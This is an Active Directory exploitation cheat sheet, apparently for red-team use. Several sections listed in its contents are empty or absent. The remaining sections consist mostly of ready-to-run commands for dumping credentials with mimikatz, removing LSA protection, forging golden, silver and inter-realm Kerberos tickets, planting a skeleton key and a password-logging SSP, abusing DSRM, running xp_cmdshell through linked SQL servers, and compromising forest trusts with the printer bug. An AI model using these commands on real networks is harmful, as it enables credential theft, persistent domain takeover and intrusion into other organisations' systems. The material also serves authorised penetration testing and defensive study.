# Active Directory Exploitation Cheat Sheet

A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.

This cheat sheet is inspired by the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo.

## Summary

- [Active Directory Exploitation Cheatsheet](#active-directory-exploitation-cheat-sheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Domain Enumeration](#domain-enumeration)
    - [Using PowerView](#using-powerview)
    - [Using AD Module](#using-ad-module)
    - [Using BloodHound](#using-bloodhound)
    - [Useful Enumeration Tools](#useful-enumeration-tools)
  - [Local Privilege Escalation](#local-privilege-escalation)
  - [Lateral Movement](#lateral-movement)
    - [Powershell Remoting](#powershell-remoting)
    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
    - [Import a powershell module and execute its functions remotely](#import-a-powershell-module-and-execute-its-functions-remotely)
    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)
    - [Mimikatz](#mimikatz)
    - [Useful Tools](#useful-tools)
  - [Domain Privilege Escalation](#domain-privilege-escalation)
    - [Kerberoast](#kerberoast)
    - [ASREPRoast](#asreproast)
    - [Password Spray Attack](#password-spray-attack)
    - [Force Set SPN](#force-set-spn)
    - [Abusing Shadow Copies](#abusing-shadow-copies)
    - [List and Decrypt Stored Credentials using Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)
    - [Unconstrained Delegation](#unconstrained-delegation)
    - [Constrained Delegation](#constrained-delegation)
    - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
    - [DNSAdmins Abuse](#dnsadmins-abuse)
    - [Abusing Active Directory-Integraded DNS](#abusing-active-directory-integraded-dns)
    - [Abusing Backup Operators Group](#abusing-backup-operators-group)
    - [Abusing Exchange](#abusing-exchange)
    - [Weaponizing Printer Bug](#weaponizing-printer-bug)
    - [Abusing ACLs](#abusing-acls)
    - [Abusing IPv6 with mitm6](#abusing-ipv6-with-mitm6)
    - [SID History Abuse](#sid-history-abuse)
    - [Exploiting SharePoint](#exploiting-sharepoint)
    - [Zerologon Exploit](#zerologon-exploit)
  - [Domain Persistence](#domain-persistence)
    - [Golden Ticket Attack](#golden-ticket-attack)
    - [DCsync Attack](#dcsync-attack)
    - [Silver Ticket Attack](#silver-ticket-attack)
    - [Skeleton Key Attack](#skeleton-key-attack)
    - [DSRM Abuse](#dsrm-abuse)
    - [Custom SSP](#custom-ssp)
  - [Cross Forest Attacks](#cross-forest-attacks)
    - [Trust Tickets](#trust-tickets)
    - [Abuse MSSQL Servers](#abuse-mssql-servers)
    - [Breaking Forest Trusts](#breaking-forest-trusts)



## Domain Enumeration

## Local Privilege Escalation

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
- [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
- [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
- [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges
- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803  
- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

  :pray: Works for Windows Server 2019 and Windows 10
- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

  :pray: Works for Windows Server 2019 and Windows 10
- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
- [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \
  [PoC](https://github.com/danigargu/CVE-2020-0796)

## Lateral Movement

### Powershell Remoting
  ```
  #Enable Powershell Remoting on current Machine (Needs Admin Access)
  Enable-PSRemoting

  #Entering or Starting a new PSSession (Needs Admin Access)
  $sess = New-PSSession -ComputerName <Name>
  Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
  ```
### Remote Code Execution with PS Credentials
  ```
  $SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
  Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
  ```
### Import a powershell module and execute its functions remotely
  ```
  #Execute the command and start a session
  Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

  #Interact with the session
  Enter-PSSession -Session $sess

  ```
### Executing Remote Stateful commands
  ```
  #Create a new session
  $sess = New-PSSession -ComputerName <NameOfComputer>

  #Execute command on the session
  Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

  #Check the result of the command to confirm we have an interactive session
  Invoke-Command -Session $sess -ScriptBlock {$ps}
  ```
### Mimikatz
  ```
  #The commands are in cobalt strike format!
  
  #Dump LSASS:
  mimikatz privilege::debug
  mimikatz token::elevate
  mimikatz sekurlsa::logonpasswords
  
  #(Over) Pass The Hash
  mimikatz privilege::debug
  mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
  
  #List all available kerberos tickets in memory
  mimikatz sekurlsa::tickets
  
  #Dump local Terminal Services credentials
  mimikatz sekurlsa::tspkg
  
  #Dump and save LSASS in a file
  mimikatz sekurlsa::minidump c:\temp\lsass.dmp
  
  #List cached MasterKeys
  mimikatz sekurlsa::dpapi
  
  #List local Kerberos AES Keys
  mimikatz sekurlsa::ekeys
  
  #Dump SAM Database
  mimikatz lsadump::sam
  
  #Dump SECRETS Database
  mimikatz lsadump::secrets
  
  #Inject and dump the Domain Controler's Credentials
  mimikatz privilege::debug
  mimikatz token::elevate
  mimikatz lsadump::lsa /inject
  
  #Dump the Domain's Credentials without touching DC's LSASS and also remotely
  mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
  
  #List and Dump local kerberos credentials
  mimikatz kerberos::list /dump
  
  #Pass The Ticket
  mimikatz kerberos::ptt <PathToKirbiFile>
  
  #List TS/RDP sessions
  mimikatz ts::sessions
  
  #List Vault credentials
  mimikatz vault::list
  ```
  
 :exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ? \
 So far i know two workarounds:
 
 - LSA as a Protected Process
 ```
 #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
 reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
 #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
 #Now lets import the mimidriver.sys to the system
 mimikatz # !+
 
 #Now lets remove the protection flags from lsass.exe process
 mimikatz # !processprotect /process:lsass.exe /remove
 
 #Finally run the logonpasswords function to dump lsass
 mimikatz # sekurlsa::logonpasswords
 ```
 - LSA is running as virtualized process (LSAISO) by Credential Guard
 ```
 #Check if a process called lsaiso.exe exists on the running processes
 tasklist |findstr lsaiso
 
 #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
 #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
 mimikatz # misc::memssp
 
 #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
 ```
  
- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Useful Tools
- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward 
  capabilities.
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe

  
## Domain Persistence

### Golden Ticket Attack
  ```
  #Execute mimikatz on DC as DA to grab krbtgt hash:
  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

  #On any machine:
  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:
  <HashOfkrbtgtAccount>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
  ```
### DCsync Attack
  ```
  #DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
  Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DomainName>\<AnyDomainUser>"'
  
  #DCsync using secretsdump.py from impacket with NTLM authentication
  secretsdump.py <Domain>/<Username>:<Password>@<DC'S IP or FQDN> -just-dc-ntlm
  
  #DCsync using secretsdump.py from impacket with Kerberos Authentication
  secretsdump.py -no-pass -k <Domain>/<Username>@<DC'S IP or FQDN> -just-dc-ntlm
  ```
  **Tip:** \
  /ptt -> inject ticket on current running session \
  /ticket -> save the ticket on the system for later use
### Silver Ticket Attack
  ```
  Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
  <ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
  ```
  [SPN List](https://adsecurity.org/?page_id=183)
### Skeleton Key Attack
  ```
  #Exploitation Command runned as DA:
  Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC's FQDN>

  #Access using the password "mimikatz"
  Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
  ```
### DSRM Abuse

*WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!*
  
```
#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName <DC's Name>

#Alter the Logon behaviour on registry:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```
Then just PTH to get local admin access on DC!
### Custom SSP

*WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!*

From powershell:
```
#Get current Security Package:
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

#Append mimilib:
$packages += "mimilib"

#Change the new packages name
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command '"misc::memssp"'
```
Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log
  
## Cross Forest Attacks

### Trust Tickets
*WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.*
  
:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!
  
Using Mimikatz:
```
#Dump the trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:  
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"'
```
:exclamation: Tickets -> .kirbi format
  
Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!
  
Using Rubeus:
```
.\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
```

### Abuse MSSQL Servers

- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
- Check Accessibility as current user: 
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
- Abusing SQL Database Links: \
*WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!*
     
Check for existing Database Links:
```
#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instace <SPN> -Verbose
     
#MSSQL Query:
select * from master..sysservers
```
Then we can use queries to enumerate other links from the linked Database:
```
#Manualy:
select * from openquery("LinkedDatabase", 'select * from master..sysservers')
     
#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
     
#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```
Query execution: 
```
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```

### Breaking Forest Trusts

*WUT IS DIS?: \
TL;DR \
If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest.*

Tools we are going to use:
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

Exploitation example:
```
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all 
```

Detailed Articles:
- [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
